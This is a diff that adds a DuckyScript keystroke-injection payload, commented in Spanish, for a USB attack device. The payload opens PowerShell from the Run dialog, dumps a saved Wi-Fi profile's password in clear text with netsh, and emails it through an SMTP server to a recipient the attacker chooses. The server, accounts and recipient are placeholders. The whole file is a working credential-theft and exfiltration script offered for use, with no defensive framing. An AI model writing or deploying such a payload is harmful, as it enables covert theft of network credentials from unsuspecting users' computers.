@@ -1,0 +1,58 @@
+
+REM Abrir PowerShell en Windows
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+DELAY 500
+STRING $wificreds = netsh wlan show profile name="SSID Wi-Fi" key=clear
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $smtpServer = "smtp.server.email"
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $smtpPort = 587
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $smtpUser = "email envio"
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $smtpPassword = 'password'
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $from = "email envio"
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $to = "receptor"
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $subject = "Credenciales Wi-Fi"
+DELAY 500
+ENTER
+
+DELAY 500
+STRING $body = "las credenciales wifi son:`n" + $wificreds
+DELAY 500
+ENTER
+
+DELAY 500
+STRING Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential (New-Object System.Management.Automation.PSCredential($smtpUser, (ConvertTo-SecureString $smtpPassword -AsPlainText -Force))) -From $from -To $to -Subject $subject -Body $body
+DELAY 500
+ENTER
